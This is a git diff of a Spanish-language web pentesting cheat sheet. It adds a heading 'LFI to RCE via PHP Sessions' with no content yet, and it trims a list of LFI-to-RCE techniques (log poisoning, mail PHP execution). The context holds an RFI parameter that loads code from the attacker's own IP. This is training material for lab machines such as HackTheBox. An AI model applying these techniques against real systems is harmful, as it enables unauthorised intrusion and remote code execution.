@@ -36,6 +36,7 @@
      * [Pentesting Web](#pentesting-web)
        * [LFI (Local File Inclusion)](#lfi)
        * [LFI to RCE](#lfi-to-rce)
+       * [LFI to RCE via PHP Sessions](#lfi-to-rce-via-php-sessions)
        * [RFI (Remote File Inclusion)](#rfi)  
        * [LFI RFI using Wrappers](#lfi-rfi-using-wrappers) 
        * [SQLI (SQL Inyection)](#sqli)     
@@ -1700,11 +1701,10 @@ windows\repair\SAM
 
 #### LFI to RCE
 
-Existen varias formas de conseguir ejecutar comandos en remoto a través de un **Local File Inclusion**, así como de acceder al sistema a través de la visualización de ciertos recursos. Para este caso, explicaré 3 técnicas a modo de ejemplo.
+Existen varias formas de conseguir ejecutar comandos en remoto a través de un **Local File Inclusion**, así como de acceder al sistema a través de la visualización de ciertos recursos. Para este caso, explicaré 2 técnicas a modo de ejemplo:
 
 * Log Poisoning (access.log & auth.log)
 * Mail PHP Execution
-* SSH Access via id_rsa Access Key
 
 La primera de ellas [**Log Poisoning**], consiste en verificar si las rutas _/var/log/auth.log_ y _/var/log/apache2/access.log_ son visibles desde el **LFI**.
 
@@ -1739,6 +1739,10 @@ Un buen ejemplo para practicar es la máquina **TartarSauce** de HackTheBox, don
 path=http://nuestraIP/wp-load.php`
 
 De esta forma, resulta sencillo pensar en lo fácil que puede llegar a ser para el caso descrito el acceso al sistema.
+
+#### LFI to RCE via PHP Sessions
+
+
 
 #### SQLI
 
